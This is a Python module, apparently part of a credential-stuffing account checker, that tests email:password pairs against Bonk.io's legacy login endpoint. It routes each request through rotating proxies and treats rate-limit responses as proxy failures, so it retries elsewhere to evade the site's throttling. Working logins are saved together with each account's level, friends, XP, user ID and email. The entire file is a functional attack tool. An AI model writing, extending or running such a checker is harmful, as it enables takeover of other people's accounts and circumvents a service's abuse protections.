from __main__ import checker
from modules.functions import set_proxy,log,save,bad_proxy
from requests import post
from math import sqrt

def check(email:str,password:str):
    retries = 0
    
    username = email.split("@")[0] if "@" in email else email
    
    while retries != checker.retries:
        proxy = set_proxy()
        data = f"username={username}&password={password}"
        try:
            a = post("https://bonk2.io/scripts/login_legacy.php",data=data,proxies=set_proxy(proxy),timeout=checker.timeout).json()
            if a["r"] == "fail":
                if a.get("e") == "ratelimited":
                    raise
                elif a.get("e") == "password" or a.get("e") == "username_fail":
                    retries += 1
                else:
                    print(a)
            elif "xp" in a:
                xp = a["xp"]
                friends = len(a["friends"])
                leg_friends = a.get("legacyFriends")
                if leg_friends:
                    try:
                        friends += len(leg_friends.split("#"))
                    except:
                        pass
                user_id = a["id"]
                if int(xp) != 0:
                    level = int(sqrt(int(xp)/100))
                else:
                    level = 0
                if not checker.cui:
                    log("good",username+":"+password,"Bonk.io")
                save("BonkIO","good",checker.time,username+":"+password+f" | Level: {level} | Friends: {friends} | Xp: {xp} | UserID: {user_id} | Email: {email}")
                checker.good += 1
                checker.cpm += 1
                return
        except:
            bad_proxy(proxy)
            checker.errors += 1
    if not checker.cui:
        log("bad",username+":"+password,"Bonk.io")
    checker.bad += 1
    checker.cpm += 1
    return
